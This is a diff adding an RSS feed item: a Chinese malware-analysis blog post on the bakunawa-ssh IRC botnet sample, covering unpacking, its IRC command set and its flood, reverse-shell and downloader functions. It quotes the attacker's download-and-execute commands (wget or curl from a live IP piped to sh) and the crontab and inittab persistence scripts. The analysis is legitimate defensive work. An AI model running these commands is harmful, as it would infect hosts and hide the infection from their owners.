@@ -9,6 +9,323 @@
     
       
       <item>
+        <title>MalwareMustDie bakunawa-ssh™样本分析</title>
+        
+          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 背景&lt;/h1&gt;
+
+&lt;p&gt;最近还是通过ssh蜜罐捕获到样本，都是通过下载sh脚本文件并执行：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;wget -qO - http://198.1.70.128/1sh | sh &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;
+rm -rf /var/run/1sh; wget -c http://198.1.70.128/1sh -P /var/run &amp;amp;&amp;amp; sh /var/run/1sh &amp;amp;
+wget -qO - http://198.1.70.128/2sh | sh &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;
+rm -rf /tmp/2sh; wget -c http://198.1.70.128/2sh -P /tmp &amp;amp;&amp;amp; sh /tmp/2sh &amp;amp;
+curl http://198.1.70.128/3sh | sh
+cd /dev/shm ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &amp;amp;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;虽然这里有3个脚本文件，但通过对比下载的二进制文件md5，实际上1sh脚本中也就涵盖了各个平台下的恶意样本，逐一下载后无脑执行就可以了：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;x01-&quot;&gt;0x01 脱壳&lt;/h1&gt;
+
+&lt;p&gt;在&lt;a href=&quot;https://www.virustotal.com/#/file/9c392a3372a6c07c0e4345b09615506f88e3870d02b6541ea3fb0650cb9286b7/details&quot;&gt;VT&lt;/a&gt;上也可以看到这是最近才发现的样本，但这些样本都会把主控端的ip地址硬编码至程序中，所以时间上是没有意义的，注意到该样本是经过UPX加壳处理的：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其实一开始&lt;code&gt;strings -a&lt;/code&gt;也可以发现疑似UPX压缩的迹象，在IDA打开后完全是瞎的，所以程序内部会先进行解压缩然后跳转执行真正的代码。首先尝试&lt;code&gt;upx -d&lt;/code&gt;脱壳未果：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里当然是针对UPX的脱壳程序做了一下处理，要不然在稍微懂点的人面前加壳跟没加一样。探索一番后发现，MalwareMustDie团队已经&lt;a href=&quot;http://blog.malwaremustdie.org/2016/04/mmd-0053-2016-bit-about-elfstd-irc-bot.html&quot;&gt;20160416分析过&lt;/a&gt;相似的样本，但给出的脱壳方法也不是太详细和便捷。在&lt;a href=&quot;https://www.pediy.com/kssd/pediy10/79061.html&quot;&gt;国内&lt;/a&gt;也有人使用IDA远程调试然后写idc脚本去dump，然而我的IDA神一般的远程attach不上，此方法有待后续探究学习。前面的文章里有提过0x8058ac0处保存的是压缩后的数据，而且还是ELF文件开头的，那我直接gdb attach上解压缩后的程序dump内存不就好了（&lt;code&gt;dump memory test2 0x08048000 0x08056000&lt;/code&gt;），机智如你：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;x02-&quot;&gt;0x02 自启动接收指令&lt;/h1&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;执行命令&lt;/h2&gt;
+
+&lt;p&gt;样本会调用getuid函数判断root权限，然后用snprintf函数完成命令字符串的构造，最终通过system函数执行命令。&lt;/p&gt;
+
+&lt;h2 id=&quot;section-1&quot;&gt;进程环境设置&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;调用setpriority函数设置进程谦让度为0。&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;将该进程设置为守护进程。&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;在127.0.0.1本地监听一个随机的端口，作为后续的互斥锁。&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;执行命令&lt;code&gt;echo &quot;nameserver 8.8.8.8&quot; &amp;gt; /etc/resolv.conf &amp;amp;&lt;/code&gt;。&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;随机strcpy以下某个字符串至argv[0]。&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;section-2&quot;&gt;自启动设置&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;查看对目录&lt;code&gt;/dev/shm/&lt;/code&gt;、&lt;code&gt;/var/tmp/&lt;/code&gt;、&lt;code&gt;/tmp/&lt;/code&gt;、&lt;code&gt;/var/lock/&lt;/code&gt;、&lt;code&gt;/var/run/&lt;/code&gt;是否有可写入权限。这里我以&lt;code&gt;/w_ok/&lt;/code&gt;代指一下。&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;如果存在&lt;code&gt;/bin/crontab&lt;/code&gt;文件则执行如下命令，说白了就是配合上面的本地监听sock保证样本一直运行。&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt; &amp;lt;div&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;chmod 700 /path/muhstiki386 &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;
+        touch -acmr /bin/ls /path/muhstiki386 #需要root权限
+        (crontab -l | grep -v &amp;quot;/path/muhstiki386&amp;quot; | grep -v &amp;quot;no cron&amp;quot; | grep -v &amp;quot;lesshts/run.sh&amp;quot; &amp;gt; /w_ok/.x00%u) &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 #%u为随机的unsigned int
+        echo &amp;quot;* * * * * /path/muhstiki386 &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;quot; &amp;gt;&amp;gt; /w_ok/.x00%u
+        crontab /w_ok/.x00%u
+        rm -rf /w_ok/.x00%u&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;lt;/div&amp;gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;如果是root权限，则执行如下命令，使样本进程在终止后重新启动进程。&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt; &amp;lt;div&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;cat /etc/inittab | grep -v &amp;quot;/path/muhstiki386&amp;quot; &amp;gt; /etc/inittab2
+        echo &amp;quot;0:2345:respawn: /path/muhstiki386&amp;quot; &amp;gt;&amp;gt; /etc/inittab2
+        cat /etc/inittab2 &amp;gt; /etc/inittab
+        rm -rf /etc/inittab2
+        touch -acmr /bin/ls /etc/inittab&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;lt;/div&amp;gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;如果存在&lt;code&gt; /etc/rc.local &lt;/code&gt;或&lt;code&gt; /etc/rc.conf &lt;/code&gt;文件可读，则向其追加&lt;code&gt;/path/muhstiki386&lt;/code&gt;，可是这些文件一般是以&lt;code&gt;exit 0&lt;/code&gt;结束的，开发者理解水平不够呀。&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;section-3&quot;&gt;接收指令&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;样本会随机连接以下的某个ip地址的9090端口，如果连接时间超过9秒则再随机选取ip地址。&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;连接上ip地址后，select的timeout时间设置为1200秒。被控端样本会拆分主控端传来的指令调用对应命令的函数指针，每条命令以’\n’分割，格式为’:arg1 cmd arg2’，或者’cmd arg2’ arg1默认为’*‘。但在分割参数时使用&lt;code&gt;strcpy(k, &amp;amp;k[l + 1])&lt;/code&gt;的方法不敢苟同。&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;x03-irc&quot;&gt;0x03 IRC命令&lt;/h1&gt;
+
+&lt;p&gt;只是从逆向层面上说明每个函数指针做了什么会很生硬，应该去理解主控端的命令。其实在这里样本连接主控端接收指令，其消息的形式走的是IRC协议，会根据IRC指令来回复主控服务器。IRC协议的标准和实现可见&lt;a href=&quot;https://groups.google.com/forum/#!topic/ircfan/5cXt1WIhpFQ&quot;&gt;这里&lt;/a&gt;，本地动态调试时可参考&lt;a href=&quot;http://larry.ngrep.me/malwaremustdie-gucci-analysis.html&quot;&gt;之前的文章&lt;/a&gt;，使用iptables发送指令给样本执行。&lt;/p&gt;
+
+&lt;h2 id=&quot;nickname&quot;&gt;Nickname生成&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;第一个%s代指本地主机的架构；%d以0或1代指是否具有root权限；然后跟着6位随机的数字；最后的%s则为成功读取的&lt;code&gt;/bin/uname -n&lt;/code&gt;、&lt;code&gt;nvram get router_name&lt;/code&gt;、&lt;code&gt;cat /etc/ISP_name&lt;/code&gt;、&lt;code&gt;cat /etc/Model_name&lt;/code&gt;的前10个字节输出，不符合对应规则的话则输出&lt;code&gt;unknown&lt;/code&gt;。&lt;/p&gt;
+
+&lt;h2 id=&quot;connection-registration&quot;&gt;Connection Registration&lt;/h2&gt;
+
+&lt;p&gt;IRC客户端在连接之前需要注册nickname，设定user message，可以看到样本会将其&lt;code&gt;username&lt;/code&gt;设为&lt;code&gt;0x00&lt;/code&gt;，&lt;code&gt;realname&lt;/code&gt;设为&lt;code&gt;1.0+tftp_jun112017&lt;/code&gt;：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;irc-command&quot;&gt;IRC Command&lt;/h2&gt;
+
+&lt;p&gt;IRC消息遵循的BNF是&lt;code&gt;&amp;lt;message&amp;gt;  ::= [':' &amp;lt;prefix&amp;gt; &amp;lt;SPACE&amp;gt; ] &amp;lt;command&amp;gt; &amp;lt;params&amp;gt; &amp;lt;crlf&amp;gt;&lt;/code&gt;，样本中会处理的命令如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;352：为RPL_WHOREPLY，设置nick对应的host，会用于后续功能的源ip地址伪造。&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;005、376、422：都会列出MOTD的内容，并且加入&lt;code&gt;#m.x86&lt;/code&gt; channel。&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;433、ERROR：会重新生成nickname的内容。&lt;/li&gt;
+  &lt;li&gt;JOIN、PING、NICK：JOIN为空函数；会用PONG指令来应答PONG；NICK可能会为客户端更改nickname。&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;PRIVMSG：向被控端发送指令执行功能或函数，遵循的格式为&lt;code&gt;[':' &amp;lt;prefix&amp;gt; &amp;lt;SPACE&amp;gt; ] #m.x86 !!nickname &amp;lt;command&amp;gt; &amp;lt;params&amp;gt; &amp;lt;crlf&amp;gt;&lt;/code&gt;。command为IRC则会回传params的内容；为SH则会执行后回传命令输出；其他command则会对比调用函数指针。&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;x04-&quot;&gt;0x04 恶意功能&lt;/h1&gt;
+
+&lt;p&gt;通过PRIVMSG调用的函数则是真正进行一些DOS，Downloader，SPOOF的功能，具体如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;xmas&quot;&gt;XMAS&lt;/h2&gt;
+
+&lt;p&gt;对指定的ip进行tcp flood攻击：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;XMAS &amp;lt;target&amp;gt; &amp;lt;port&amp;gt; &amp;lt;secs&amp;gt; &amp;lt;cwr,ece,urg,ack,psh,rst,fin,syn or null&amp;gt; &amp;lt;random/not&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;port为0会随机设置源端口；如果没有设置源ip netlong则会随机生成源ip；secs为攻击持续时间；根据参数设置tcp数据包的flags；random则会随机设定tcp data数据长度为[0, 20]，window size也会随机设置，否则data为20，window size为32120。&lt;/p&gt;
+
+&lt;h2 id=&quot;pan&quot;&gt;PAN&lt;/h2&gt;
+
+&lt;p&gt;对指定ip进行syn flood攻击，与XMAS相似，但源ip是完全随机的：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;PAN &amp;lt;target&amp;gt; &amp;lt;port&amp;gt; &amp;lt;secs&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;sudp&quot;&gt;SUDP&lt;/h2&gt;
+
+&lt;p&gt;对指定ip进行udp flood攻击，与XMAS相似，ip length设置为1500：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;SUDP &amp;lt;target&amp;gt; &amp;lt;port&amp;gt; &amp;lt;secs&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;udp&quot;&gt;UDP&lt;/h2&gt;
+
+&lt;p&gt;与SUDP相似，但源ip随机：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;UDP &amp;lt;target&amp;gt; &amp;lt;port&amp;gt; &amp;lt;secs&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;std&quot;&gt;STD&lt;/h2&gt;
+
+&lt;p&gt;对指定ip进行udp flood，data为4个字节，使用的是本地源ip：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;STD &amp;lt;target&amp;gt; &amp;lt;port&amp;gt; &amp;lt;secs&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;std2&quot;&gt;STD2&lt;/h2&gt;
+
+&lt;p&gt;与STD相似，data可以自定义为&lt;code&gt;&amp;lt;funny_data&amp;gt;&lt;/code&gt;的内容：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;STD2 &amp;lt;target&amp;gt; &amp;lt;port&amp;gt; &amp;lt;secs&amp;gt; &amp;lt;funny_data&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;junk&quot;&gt;JUNK&lt;/h2&gt;
+
+&lt;p&gt;对指定ip和port进行tcp connect flood，使用1个字节的data，threads最高设置为64：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;JUNK &amp;lt;target&amp;gt; &amp;lt;port&amp;gt; &amp;lt;time&amp;gt; &amp;lt;threads&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;不过第一次见这样也算是thread 的：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;unknown&quot;&gt;UNKNOWN&lt;/h2&gt;
+
+&lt;p&gt;对指定ip进行udp flood，使用本地源ip，目的端口随机，ip length设置为9216：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;UNKNOWN &amp;lt;target&amp;gt; &amp;lt;secs&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;l7unknown&quot;&gt;L7.UNKNOWN&lt;/h2&gt;
+
+&lt;p&gt;对指定ip和port进行http flood：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;l7.unknown &amp;lt;target&amp;gt; &amp;lt;port&amp;gt; &amp;lt;time&amp;gt; &amp;lt;threads&amp;gt; &amp;lt;/shit.php?id=&amp;gt; &amp;lt;random/not&amp;gt; &amp;lt;(n if random) or not&amp;gt; &amp;lt;GET/HEAD/POST&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;threads最大为64；参数6如果为random，则会生成n（n&amp;lt;=10）位的数字作为id值；请求头中的User-Agent会是89选1，POST数据包为1个字节：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;l7unknown2&quot;&gt;L7.UNKNOWN2&lt;/h2&gt;
+
+&lt;p&gt;与L7.UNKNOWN相似，threads最大为256，增加了host_header：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt; l7.unknown2 &amp;lt;targetip&amp;gt; &amp;lt;host_header&amp;gt; &amp;lt;port&amp;gt; &amp;lt;time&amp;gt; &amp;lt;threads&amp;gt; &amp;lt;/shit.php?id=&amp;gt; &amp;lt;random/not&amp;gt; &amp;lt;(n if rand om) or not&amp;gt; &amp;lt;GET/HEAD/POST&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;dns&quot;&gt;DNS&lt;/h2&gt;
+
+&lt;p&gt;解析某一host：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt; DNS &amp;lt;host&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;cback&quot;&gt;CBACK&lt;/h2&gt;
+
+&lt;p&gt;向指定ip和port回传shell：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt; CBACK &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;killall&quot;&gt;KILLALL&lt;/h2&gt;
+
+&lt;p&gt;在执行每个指令时客户端都会fork子进程执行并记录其pid，KILLALL就是kill掉所有记录的子进程：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;spoofs&quot;&gt;SPOOFS&lt;/h2&gt;
+
+&lt;p&gt;接收参数则会设置netlong为对应的subnet address，当没有参数时则会移除netlong。&lt;/p&gt;
+
+&lt;h2 id=&quot;getspoofs&quot;&gt;GETSPOOFS&lt;/h2&gt;
+
+&lt;p&gt;获取当前spoof的netlong范围。&lt;/p&gt;
+
+&lt;h2 id=&quot;get&quot;&gt;GET&lt;/h2&gt;
+
+&lt;p&gt;http downloader:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt; GET &amp;lt;host&amp;gt; &amp;lt;save as&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;server&quot;&gt;SERVER&lt;/h2&gt;
+
+&lt;p&gt;可以更换客户端中主控端的ip地址。&lt;/p&gt;
+
+&lt;h2 id=&quot;version&quot;&gt;VERSION&lt;/h2&gt;
+
+&lt;p&gt;原来你的名字是——bakunawa-ssh™：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;help&quot;&gt;HELP&lt;/h2&gt;
+
+&lt;p&gt;大体功能简介：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;shelp&quot;&gt;SHELP&lt;/h2&gt;
+
+&lt;p&gt;ssh扫描功能，但样本中未发现具体实现：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;dhelp&quot;&gt;DHELP&lt;/h2&gt;
+
+&lt;p&gt;DDOS功能的介绍，和前文一样：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;x05-&quot;&gt;0x05 总结&lt;/h1&gt;
+
+&lt;p&gt;bakunawa-ssh™这个样本经过UPX加壳，并针对于UPX的脱壳过程动了些手脚，其实样本的开始还是有反调试的：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;碰巧gdb attach一起绕过了。被控端连接硬编码的IRC主控端服务器，使用IRC协议来传递消息执行DDOS、反弹shell、Downloader等功能。通过其版本号&lt;code&gt;1.0+tftp_jun112017&lt;/code&gt;，可以知道这是今年中旬的样本，也捕获过其他该样本的老版本：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171219/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;所以该样本肯定是在不断地编程发展，可以监控主控端的指令做进一步的感知，针对恶意软件elf文件的解构知识也需加强。&lt;/p&gt;
+
+</description>
+        
+        <pubDate>Tue, 19 Dec 2017 00:00:00 +0800</pubDate>
+        <link>
+        https://larryxi.github.io/malwaremustdie-bakunawa-ssh-analysis.html</link>
+        <guid isPermaLink="true">https://larryxi.github.io/malwaremustdie-bakunawa-ssh-analysis.html</guid>
+      </item>
+      
+    
+      
+      <item>
         <title>MalwareMustDie Gucci样本分析</title>
         
           <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 背景&lt;/h1&gt;
